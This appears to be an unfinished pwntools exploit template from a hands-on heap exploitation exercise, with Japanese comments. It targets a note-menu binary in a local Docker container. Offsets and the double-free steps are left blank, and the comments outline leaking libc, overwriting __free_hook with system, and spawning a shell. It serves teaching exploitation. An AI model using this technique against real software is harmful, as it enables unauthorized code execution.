#!/usr/bin/python3
#-*-coding:utf-8-*-

from pwn import *
context.arch = 'amd64'

   
############## Utils #################
def menu():
  _  = s.readuntil('1: create note')
  _ += s.readuntil('2: delete note')
  _ += s.readuntil('3: exit')
  _ += s.readuntil('Command >> ')
  #print(_)
  return;

def create_note(size, data):
  s.sendline('1')                    # Command >> 1 ; 1. create noteをメニュー選択
  s.recvuntil('[*] Note data size:') # プロンプト読み取り
  s.sendline(str(size))              # Note data sizeを指定
  s.recvuntil('[*] Note data: ')     # プロンプト読み取り
  s.sendline(data)                   # 実際にデータを送る. 
  # 格納したノートのインデックスを読み取り, 整数データとして返す. 
  idx = s.recvline().strip().decode().split(':')[-1] 
  idx = int(idx)
  menu()
  return idx

def delete_note(idx):
  s.sendline('2')                    # Command >> 2; 2. delete noteをメニュー選択
  s.recvuntil('[+] Note index: ')
  s.sendline(str(idx))               # 削除したいノートのインデックスを引数に指定 
  menu()
  return 

HOST, PORT = '172.17.0.2', 1337 # 自身のコンテナ環境内でifconfigで確認したIPに置き換えること. 


### nmコマンドから各種オフセットを求めておく. 
"""
nm -D /tmp/libc-2.27.so | grep -E -e 'V (__malloc_hook|__free_hook)' -e ' puts$' -e ' system'
one_gadget /tmp/libc-2.27.so
"""
ofs_puts        = 
ofs_malloc_hook =
ofs_free_hook   = 
ofs_system      = 
ofs_binsh       = # 使わなくてもよい. 
## one gadgetを利用する場合
## ofs_onegadget   = 

s = remote(HOST, PORT)
# puts関数のアドレスを読み取り. 
addr_puts  = int(s.readline().strip().decode().split(':')[-1] , 16)
print(f"address of `puts`: {addr_puts :#08x}")
menu()

## オフセットからlibcのベースアドレスを算出して, シンボルのアドレスを解決. 
libc_base   = 
addr_system =  
malloc_hook =
free_hook   = 
binsh       = # 使わなくても良い. 
## one_gadgetを利用する場合. 
one_gadget  = 

 
## double-freeで関数ポインタを書き換え. 
A = create_note(0x10, b'A' * 0x0f)

## ここでdouble-freeを作る. 

input('gdb?') ## デバッグ確認用: docker内コンソールから gdb -p $(pidof handson2)

## 書き込む値はなにか？=>今回は__free_hook(freeした時に呼び出される関数ポインタ)

input('gdb?') ## デバッグ確認用: gdb配下で, cont => p/x __free_hook => 書き換えた値になっていればOK


## 書き換えた関数ポインタをトリガ
## シェル起動時は, system関数のアドレスで__free_hookを書き換え.
## メモリに整数値を書き込むときはp64(<書き込みたい整数値>)を使うと良いです. 

# s.interactive()
